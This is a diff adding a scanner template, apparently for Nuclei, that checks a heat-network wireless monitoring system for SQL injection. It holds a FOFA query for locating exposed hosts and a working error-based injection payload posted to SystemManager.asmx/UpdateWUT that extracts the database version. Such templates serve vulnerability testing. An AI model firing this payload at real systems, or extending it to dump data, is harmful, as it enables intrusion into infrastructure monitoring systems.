@@ -1,0 +1,34 @@
+id: rewangwuxian-SystemManager_asmx-sql
+
+info:
+  name: 热网无线监测系统 SystemManager.asmx SQL注入
+  author: HuanXiong
+  severity: high
+  description: |-
+    fofa: body="Downloads/HDPrintInstall.rar" || body="skins/login/images/btn_login.jpg"
+
+  tags: SQL Injection
+
+http:
+  - raw:
+      - |
+        POST /DataSrvs/SystemManager.asmx/UpdateWUT HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        id=%28SELECT+CHAR%28113%29%2BCHAR%28120%29%2BCHAR%28118%29%2BCHAR%28113%29%2BCHAR%28113%29%2B%28CASE+WHEN+%281675%3D1675%29+THEN+@@version+ELSE+CHAR%2848%29+END%29%2BCHAR%28113%29%2BCHAR%28112%29%2BCHAR%28118%29%2BCHAR%28118%29%2BCHAR%28113%29%29&name=&desc=
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '转换成数据类型 int 时失败'
+      - type: status
+        status: 
+          - 500
+
+
+
+
+
